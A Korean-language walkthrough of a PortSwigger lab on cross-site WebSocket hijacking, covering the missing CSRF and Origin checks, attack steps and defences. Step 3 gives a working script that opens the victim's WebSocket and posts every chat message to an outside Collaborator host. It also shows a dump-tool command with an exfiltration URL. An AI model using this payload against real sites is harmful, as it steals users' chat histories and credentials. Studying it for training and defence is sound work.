# Lab: Cross-site WebSocket hijacking

## 개요

- **난이도**: Practitioner
- **주제**: WebSockets — Cross-Site WebSocket Hijacking(CSWSH) / 핸드셰이크 인증 결함 / 채팅 기록 탈취
- **링크**: https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab

## 목표

익스플로잇 서버에 CSWSH 페이로드를 호스팅해 피해자(상담원)의 채팅 기록을 탈취하고, 그 안의 자격증명으로 계정에 접근한다.

## CSWSH 기초 개념

### WebSocket 핸드셰이크와 인증

```
[핸드셰이크]
  GET /chat HTTP/1.1
  Host: LAB-ID.web-security-academy.net
  Upgrade: websocket
  Connection: Upgrade
  Cookie: session=<피해자 세션>     ← 인증이 쿠키에만 의존
  (CSRF 토큰 없음, Origin 검증 없음)
```

```
[CSWSH 란]
  WebSocket 핸드셰이크가 쿠키 기반 인증에만 의존하고
  CSRF 토큰/Origin 검증이 없을 때,
  공격자 사이트의 JS 가 피해자 브라우저에서 WebSocket 연결을 열면
  → 브라우저가 피해자 세션 쿠키를 자동 첨부
  → 공격자 페이지가 그 연결로 서버 응답(채팅 기록 등)을 읽을 수 있음
```

일반 CSRF는 "요청을 보내는 것" 까지지만, CSWSH는 **응답을 읽을 수 있어** 정보 탈취로 이어진다.

## 취약 지점

### 1. 핸드셰이크가 쿠키 인증만 사용

```
GET /chat  (Upgrade: websocket)
Cookie: session=...
→ CSRF 토큰이 없어 다른 사이트에서도 연결 가능
```

### 2. Origin 검증 부재

```
서버가 Origin 헤더를 검사하지 않음
→ 공격자 도메인에서 시작된 WebSocket 연결도 허용
```

### 3. `READY` 명령으로 과거 기록 반환

```
WebSocket 연결 후 "READY" 를 보내면
서버가 해당 사용자의 과거 채팅 메시지(JSON)를 전송
→ 자격증명 등 민감 정보 포함 가능
```

## 공격 단계

### 1단계 — WebSocket 동작 확인

Live chat 에서 메시지를 보내고 새로고침한다.
Burp **Proxy → WebSockets history** 에서 `READY` 로 과거 메시지를 가져오는 것을 확인한다.

### 2단계 — 핸드셰이크 확인

Burp **HTTP history** 에서 WebSocket **핸드셰이크 요청**을 찾는다.
CSRF 토큰이 없는지 확인하고 **Copy URL** 한다.

```
https://LAB-ID.web-security-academy.net/chat
```

### 3단계 — 익스플로잇 작성

익스플로잇 서버 Body 에 다음을 붙여넣고 치환한다.

```html
<script>
    var ws = new WebSocket('wss://LAB-ID.web-security-academy.net/chat');
    ws.onopen = function () {
        ws.send("READY");
    };
    ws.onmessage = function (event) {
        fetch('https://YOUR-COLLABORATOR.oastify.com', {
            method: 'POST',
            mode: 'no-cors',
            body: event.data
        });
    };
</script>
```

- `https://` → `wss://` 로 변경
- Collaborator 도메인으로 각 메시지를 POST

### 4단계 — 자기 세션으로 테스트

`View exploit` 로 직접 열어 Collaborator 에 내 채팅 메시지가 도착하는지 확인한다.

### 5단계 — 피해자에게 전달

`Deliver to victim` → Collaborator 를 다시 확인한다.
피해자(상담원)의 채팅 메시지가 다수 도착하며, 그중 하나에 **username/password** 가 포함된다.

### 6단계 — 로그인

탈취한 자격증명으로 로그인 → 랩 해결.

## 관련 파일/툴

```
tools/15-websocket-cswsh-exploit.html   CSWSH 익스플로잇 템플릿
tools/15-websocket-chat-dump.py          WebSocket 접속/히스토리 덤프·수신 점검 헬퍼
```

보조 검증(본인 세션으로 WebSocket 동작/수신 확인):

```
python3 tools/15-websocket-chat-dump.py \
  --target "https://LAB-ID.web-security-academy.net" \
  --cookie "session=<내 세션>" --exfil-url "https://<collaborator>.oastify.com"
```

## 방어

```
[근본 원인]
  WebSocket 핸드셰이크가 쿠키 인증에만 의존
  + CSRF 토큰/Origin 검증 부재
  + 요청 하나로 민감한 기록을 반환

[올바른 방어]
  1. WebSocket 핸드셰이크에 CSRF 방어 적용
     - 예측 불가능한 CSRF 토큰을 handshake 에 요구 (세션과 결합)
     - 토큰이 없거나 틀리면 연결 거부
  2. Origin 헤더 검증
     - 신뢰하는 Origin 화이트리스트만 허용
     - (Origin 은 브라우저가 설정하므로 위조 방지에 유효)
  3. 쿠키 속성 강화
     - SameSite=Lax/Strict 로 크로스 사이트 쿠키 전송 제한
     - Secure, HttpOnly
  4. 인증/인가를 연결 시점과 메시지 처리 시점 모두에서 검사
     - 연결 후에도 세션 유효성 재확인
  5. 민감 정보를 요청만으로 반환하지 않도록 최소화

[주의]
  Origin 검증과 CSRF 토큰이 없으면 쿠키 기반 인증만으로 연결이 허용되어
  다른 사이트의 JS 가 응답(채팅 기록)까지 읽는 CSWSH 가 성립한다.
```

## 핵심 정리

- WebSocket 핸드셰이크가 쿠키 인증만 사용하고 CSRF 토큰/Origin 검증이 없어 CSWSH 가 성립했다.
- 익스플로잇 페이지가 피해자 브라우저에서 WebSocket 을 열고 `READY` 를 보내 채팅 기록을 읽은 뒤 Collaborator 로 전송했다.
- 탈취한 기록에서 피해자 자격증명을 얻어 로그인했다.
- 방어는 핸드셰이크 CSRF 토큰 + Origin 검증 + SameSite 쿠키다.

## 배운 점

- 001(메시지 조작 XSS)이 "WebSocket도 입력값" 이라면, 002(CSWSH)는 "핸드셰이크 인증/CSRF" 문제다.
- WebSocket 은 CSRF/SOP 보호를 자동으로 받지 않으므로, HTTP 와 동일한 수준의 CSRF·Origin 대책이 필요하다.
- CSWSH 는 요청 위조를 넘어 응답 탈취까지 가능해 임팩트가 크다.
- 이 랩을 위해 익스플로잇 템플릿과 WebSocket 덤프 툴을 작성했다.
